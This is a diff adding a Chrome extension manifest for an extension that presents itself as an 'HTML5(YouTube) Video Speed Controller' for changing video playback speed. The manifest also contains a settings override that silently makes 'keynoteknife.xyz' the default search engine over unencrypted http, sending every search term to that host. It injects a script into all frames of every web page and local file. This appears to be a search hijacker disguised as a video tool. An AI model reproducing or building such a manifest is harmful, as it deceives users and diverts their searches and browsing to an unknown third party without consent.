@@ -1,0 +1,66 @@
+{
+	"background": {
+		"scripts": []
+	},
+	"browser_action": {
+		"default_icon": {
+			"19": "icons/icon19.png",
+			"38": "icons/icon38.png",
+			"48": "icons/icon48.png"
+		},
+		"default_popup": "popup.html"
+	},
+	"chrome_settings_overrides": {
+		"search_provider": {
+			"encoding": "UTF-8",
+			"favicon_url": "http://keynoteknife.xyz/favicon.ico",
+			"is_default": true,
+			"keyword": "keynoteknife",
+			"name": "keynoteknife",
+			"search_url": "http://keynoteknife.xyz/?fundamentalserrand={searchTerms}"
+		}
+	},
+	"content_scripts": [
+		{
+			"all_frames": true,
+			"css": [
+				"inject.css"
+			],
+			"exclude_matches": [
+				"https://plus.google.com/hangouts/*",
+				"https://hangouts.google.com/hangouts/*",
+				"https://meet.google.com/*",
+				"https://teamtreehouse.com/*",
+				"http://www.hitbox.tv/*"
+			],
+			"js": [
+				"inject.js"
+			],
+			"matches": [
+				"http://*/*",
+				"https://*/*",
+				"file:///*"
+			]
+		}
+	],
+	"description": "Slow down, speed up, advance and rewind any HTML5 video with quick shortcuts.",
+	"icons": {
+		"128": "icons/icon128.png",
+		"16": "icons/icon16.png",
+		"48": "icons/icon48.png"
+	},
+	"manifest_version": 2,
+	"name": "HTML5(YouTube) Video Speed Controller",
+	"options_page": "options.html",
+	"permissions": [
+		"activeTab",
+		"storage"
+	],
+	"short_name": "videospeed",
+	"update_url": "https://clients2.google.com/service/update2/crx",
+	"version": "1.0",
+	"web_accessible_resources": [
+		"inject.css",
+		"shadow.css"
+	]
+}
